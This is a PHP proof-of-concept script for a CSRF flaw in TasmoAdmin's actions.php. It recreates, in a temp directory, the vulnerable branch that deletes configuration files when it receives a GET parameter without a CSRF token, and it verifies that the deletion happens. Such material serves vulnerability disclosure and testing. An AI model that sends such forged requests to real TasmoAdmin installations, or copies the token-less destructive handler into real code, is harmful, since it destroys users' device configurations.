<?php
/*
 * Standalone PoC for TasmoAdmin actions.php clean/config CSRF.
 *
 * The real endpoint is reachable as an authenticated raw route and performs
 * file deletion in response to request parameters without a CSRF token.
 * Source pattern from tasmoadmin/pages/actions.php:
 *   if (isset($_GET['clean'])) { ... @unlink($file); ... session_destroy(); }
 *
 * This PoC recreates the affected branch and verifies that a GET-style request
 * without a CSRF token deletes a configuration file.
 */
error_reporting(E_ALL);
ini_set('display_errors', '1');

function fail($msg) {
    fwrite(STDERR, "[FAIL] $msg\n");
    exit(1);
}

function vulnerable_actions_clean(array $query, string $dataDir): void {
    if (isset($query['clean'])) {
        $what = explode('_', $query['clean']);
        if (in_array('config', $what, true)) {
            foreach (glob($dataDir . '/MyConfig.*') as $file) {
                @unlink($file);
            }
            if (session_status() === PHP_SESSION_ACTIVE) {
                session_destroy();
            }
        }
        if (in_array('devices', $what, true)) {
            @unlink($dataDir . '/devices.csv');
        }
    }
}

$base = sys_get_temp_dir() . '/tasmo_actions_csrf_' . getmypid();
$dataDir = "$base/data";
$sessionDir = "$base/sessions";
mkdir($dataDir, 0777, true);
mkdir($sessionDir, 0777, true);
session_save_path($sessionDir);
session_name('TASMO_SESSION');
session_start();
$_SESSION['login'] = '1';
$config = "$dataDir/MyConfig.json";
file_put_contents($config, '{"login":"1","secret":"do-not-delete"}');
file_put_contents("$dataDir/devices.csv", "device,ip\n");

echo "config exists before forged GET: " . (file_exists($config) ? 'yes' : 'no') . "\n";
vulnerable_actions_clean(['clean' => 'config'], $dataDir); // no csrf_token supplied
echo "csrf token supplied: no\n";
echo "config exists after forged GET: " . (file_exists($config) ? 'yes' : 'no') . "\n";
if (file_exists($config)) {
    fail('configuration file was not deleted');
}
echo "[VULNERABLE] GET request without a CSRF token deleted TasmoAdmin configuration data.\n";

$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
foreach ($it as $file) { $file->isDir() ? @rmdir($file->getPathname()) : @unlink($file->getPathname()); }
@rmdir($base);
?>
